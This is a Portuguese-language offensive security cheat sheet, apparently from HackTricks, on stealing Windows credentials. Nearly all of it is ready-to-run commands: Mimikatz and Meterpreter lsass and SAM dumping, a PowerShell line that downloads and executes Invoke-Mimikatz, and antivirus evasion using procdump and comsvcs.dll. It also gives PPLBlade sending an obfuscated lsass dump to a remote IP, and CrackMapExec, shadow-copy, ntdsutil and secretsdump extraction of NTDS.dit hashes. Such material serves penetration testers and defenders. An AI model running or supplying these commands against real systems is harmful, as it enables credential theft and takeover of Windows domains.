# Roubo de Credenciais do Windows

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Credenciais Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Descubra outras funcionalidades do Mimikatz em** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Estas proteções podem impedir que o Mimikatz extraia algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Plugin de Credenciais**](https://github.com/carlospolop/MSF-Credentials) **que** eu criei para **procurar por senhas e hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassando AV

### Procdump + Mimikatz

Como o **Procdump da** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **é uma ferramenta legítima da Microsoft**, ele não é detectado pelo Defender.\
Você pode usar essa ferramenta para **despejar o processo lsass**, **baixar o despejo** e **extrair** as **credenciais localmente** a partir do despejo.

{% code title="Despejar lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extrair credenciais do dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Este processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe para despejar lsass.exe**, isso ocorre porque estão **detectando** a string **"procdump.exe" e "lsass.exe"**. Portanto, é mais **discreto** **passar** como **argumento** o **PID** de lsass.exe para procdump **em vez de** o **nome lsass.exe.**

### Despejando lsass com **comsvcs.dll**

Há uma DLL chamada **comsvcs.dll**, localizada em `C:\Windows\System32` que **despeja a memória do processo** sempre que eles **falham**. Esta DLL contém uma **função** chamada **`MiniDumpW`** que é escrita para ser chamada com `rundll32.exe`.\
Os dois primeiros argumentos não são usados, mas o terceiro é dividido em 3 partes. A primeira parte é o ID do processo que será despejado, a segunda parte é o local do arquivo de despejo, e a terceira parte é a palavra **full**. Não há outra escolha.\
Uma vez que esses 3 argumentos são analisados, basicamente esta DLL cria o arquivo de despejo e despeja o processo especificado nesse arquivo de despejo.\
Graças a essa função, podemos usar **comsvcs.dll** para despejar o processo lsass em vez de fazer upload do procdump e executá-lo. (Esta informação foi extraída de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Devemos apenas ter em mente que essa técnica só pode ser executada como **SYSTEM**.

**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Extraindo lsass com o Gerenciador de Tarefas**

1. Clique com o botão direito na Barra de Tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure pelo processo "Local Security Authority Process" na aba Processos
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Criar arquivo de despejo".

### Extraindo lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte do conjunto [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Despejando lsass com PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta de despejo de processos protegidos que suporta a ofuscação de despejo de memória e a transferência para estações de trabalho remotas sem gravá-lo no disco.

**Funcionalidades principais**:

1. Contornando a proteção PPL
2. Ofuscando arquivos de despejo de memória para evitar mecanismos de detecção baseados em assinaturas do Defender
3. Enviando despejo de memória com métodos de upload RAW e SMB sem gravá-lo no disco (despejo sem arquivo)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Extrair hashes SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extrair segredos do LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extrair o NTDS.dit do DC alvo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extrair o histórico de senhas NTDS.dit do DC alvo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Exibir o atributo pwdLastSet para cada conta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Roubo de SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode simplesmente copiá-los de maneira regular** porque eles são protegidos.

### Do Registro

A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Cópia de Sombra de Volume

Você pode realizar a cópia de arquivos protegidos usando este serviço. Você precisa ser Administrador.

#### Usando vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo a partir do **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido utilizado é "C:" e é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Finalmente, você também pode usar o [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia de SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

**O arquivo Ntds.dit é um banco de dados que armazena dados do Active Directory**, incluindo informações sobre objetos de usuários, grupos e membros de grupos. Ele contém os hashes de senha para todos os usuários no domínio.

O importante arquivo NTDS.dit estará **localizado em**: _%SystemRoom%/NTDS/ntds.dit_\
Este arquivo é um banco de dados _Extensible Storage Engine_ (ESE) e é "oficialmente" composto por 3 tabelas:

* **Tabela de Dados**: Contém as informações sobre os objetos (usuários, grupos...)
* **Tabela de Links**: Informações sobre as relações (membro de...)
* **Tabela SD**: Contém os descritores de segurança de cada objeto

Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é usado pelo _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode ser localizada **dentro da memória do `lsass`** (você pode encontrar os dados mais recentemente acessados provavelmente por causa da melhoria de desempenho ao usar um **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Descriptografar a Chave de Criptografia de Senha (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

**PEK** tem o **mesmo valor** em **cada controlador de domínio**, mas é **cifrado** dentro do arquivo **NTDS.dit** usando o **BOOTKEY** do **arquivo SYSTEM do controlador de domínio (é diferente entre controladores de domínio)**. É por isso que para obter as credenciais do arquivo NTDS.dit **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque de [**cópia de sombra de volume**](./#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do **arquivo SYSTEM** (novamente, [**extraia-o do registro ou use o truque de cópia de sombra de volume**](./#stealing-sam-and-system)).

### **Extraindo hashes do NTDS.dit**

Uma vez que você tenha **obtido** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extrair automaticamente** usando um usuário administrador de domínio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **grandes arquivos NTDS.dit** é recomendado extrair usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, você também pode usar o **módulo metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Objetos NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também os objetos inteiros e seus atributos para extração de informações adicionais quando o arquivo NTDS.dit bruto já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
```markdown
O `SYSTEM` hive é opcional, mas permite a descriptografia de segredos (hashes NT & LM, credenciais suplementares como senhas em texto claro, chaves kerberos ou de confiança, históricos de senha NT & LM). Junto com outras informações, os seguintes dados são extraídos: contas de usuário e máquina com seus hashes, flags UAC, carimbo de data/hora para último login e mudança de senha, descrição das contas, nomes, UPN, SPN, grupos e membros recursivos, árvore de unidades organizacionais e membros, domínios confiáveis com tipo de confiança, direção e atributos...

## Lazagne

Baixe o binário [aqui](https://github.com/AlessandroZ/LaZagne/releases). você pode usar este binário para extrair credenciais de vários softwares.
```
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrai credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrair credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Baixe-o em: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e simplesmente **execute-o** e as senhas serão extraídas.

## Defesas

[**Aprenda sobre algumas proteções de credenciais aqui.**](credentials-protections.md)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo do [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
